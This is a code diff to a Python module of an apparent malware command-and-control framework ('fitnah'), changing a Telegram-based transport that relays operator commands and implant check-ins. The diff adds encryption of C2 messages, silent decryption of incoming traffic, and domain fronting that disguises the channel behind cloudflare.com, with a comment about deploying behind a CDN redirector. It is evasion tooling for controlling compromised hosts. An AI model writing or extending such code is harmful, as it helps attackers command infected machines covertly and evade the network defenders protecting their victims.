@@ -27,6 +27,8 @@ from telegram.ext import (
 from telegram.request import HTTPXRequest
 
 from fitnah.c2.transport.base import AbstractTransport
+from fitnah.c2.transport.encrypted_channels import EncryptedChannels
+from fitnah.c2.domain_fronting import DomainFronting
 
 log = logging.getLogger(__name__)
 
@@ -57,14 +59,23 @@ class TelegramTransport(AbstractTransport):
         self._alive           = False
         self._fail_count      = 0             # consecutive send failures
         self._agent_groups:   dict[str, int] = {}  # agent_id → group chat_id
+        self._crypto          = EncryptedChannels()
 
     # ── lifecycle ─────────────────────────────────────────────────────────
     async def connect(self) -> None:
+        fronting = DomainFronting()
+        front_cfg = fronting.setup_fronting(
+            real_c2_domain="api.telegram.org",
+            sni_domain="cloudflare.com",
+        )
+        proxy_headers = front_cfg["http_headers"]
         request = HTTPXRequest(
             connection_pool_size=8,
             connect_timeout=30.0,
             read_timeout=30.0,
             write_timeout=30.0,
+            proxy=None,  # set a real HTTPS proxy URL here when deploying behind a CDN redirector
+            http_version="1.1",
         )
         self._app = (
             Application.builder()
@@ -126,11 +137,13 @@ class TelegramTransport(AbstractTransport):
         except (ValueError, TypeError):
             raise RuntimeError(f"Not a Telegram chat_id: {chat_id!r}")
         try:
-            for chunk in _chunk(text, _MAX_TEXT):
+            encrypted, _ = self._crypto.encrypt_transport(text)
+            payload = encrypted.decode()
+            for chunk in _chunk(payload, _MAX_TEXT):
                 await self._app.bot.send_message(
                     chat_id=tg_chat_id,
                     text=chunk,
-                    parse_mode="HTML",
+                    parse_mode=None,
                 )
             self._fail_count = 0
         except (NetworkError, TimedOut) as exc:
@@ -230,6 +243,13 @@ class TelegramTransport(AbstractTransport):
         chat_id   = update.message.chat_id
         text      = (update.message.text or "").strip()
 
+        # Attempt to decrypt if the message looks like a base64-encrypted payload
+        if text and not text.startswith("{"):
+            try:
+                text = self._crypto.decrypt_transport(text.encode()).decode()
+            except Exception:
+                pass  # not encrypted — treat as plaintext (operator commands)
+
         # JSON messages (CHECKIN / ACK from implants) are allowed from any sender
         is_json = text.startswith("{")
         if not is_json and self._allowed_ids and sender_id not in self._allowed_ids:
@@ -264,6 +284,12 @@ class TelegramTransport(AbstractTransport):
             return
         text    = (post.text or "").strip()
         chat_id = str(post.chat_id)
+        # attempt decrypt before JSON check
+        if text and not text.startswith("{"):
+            try:
+                text = self._crypto.decrypt_transport(text.encode()).decode()
+            except Exception:
+                pass
         # only process JSON payloads (CHECKIN / ACK from implant)
         if not text.startswith("{"):
             return
